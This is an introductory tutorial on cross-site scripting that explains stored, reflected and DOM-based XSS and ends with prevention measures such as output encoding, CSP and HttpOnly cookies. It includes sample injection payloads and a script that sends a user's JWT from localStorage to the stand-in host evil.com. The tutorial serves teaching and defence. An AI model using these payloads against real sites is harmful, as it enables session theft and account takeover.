💻 PART 2: What is XSS (Simple Definition)

XSS (Cross-Site Scripting) =
👉 Hacker injects malicious JavaScript code into a website, and the browser runs it.

🧨 PART 3: Real Example (Super Simple)
Normal website code:
Hello Abhishek

Hacker input:
<script>alert("Hacked!")</script>


If website does not clean input → browser runs it.

👉 Popup appears.

😈 PART 4: How Hackers Use XSS (Real Attack)
Example: Steal JWT Token
<script>
fetch("https://evil.com/steal?token=" + localStorage.getItem("jwt"));
</script>


👉 Your browser sends JWT to hacker server.
👉 Hacker logs in as YOU.

🔥 PART 5: Types of XSS (Important)
1️⃣ Stored XSS (Worst)

Hacker stores script in database.

Example:

Comment box:

Nice video <script>steal()</script>


Everyone who opens page → script runs.

2️⃣ Reflected XSS

Script comes from URL.

https://site.com/search?q=<script>alert(1)</script>


Server prints search term without filtering.

3️⃣ DOM-based XSS

JavaScript code itself is vulnerable.

document.innerHTML = location.hash;


Hacker changes URL hash.

🧠 PART 6: Why XSS is Dangerous
XSS can:

Steal cookies

Steal JWT tokens

Change website content

Perform actions as user

Keylog passwords

Redirect to fake login pages

👉 Full account takeover.

🧨 PART 7: XSS vs JWT Storage
Storage	Can XSS steal it?
LocalStorage	✅ YES
SessionStorage	✅ YES
HTTP-only Cookie	❌ NO
🔐 PART 8: How to Prevent XSS (Very Important)
✅ 1. Input Validation & Output Encoding

Never directly show user input.

String safe = HtmlUtils.htmlEscape(userInput);

✅ 2. Use Content Security Policy (CSP)
Content-Security-Policy: script-src 'self';


Blocks inline scripts.

✅ 3. Use HttpOnly Cookies
Set-Cookie: jwt=abc; HttpOnly;


JavaScript cannot read cookie.

✅ 4. Avoid innerHTML

❌ Bad:

element.innerHTML = userInput;


✅ Good:

element.textContent = userInput;

✅ 5. Use Framework Protection

React, Angular, Vue auto-escape HTML.
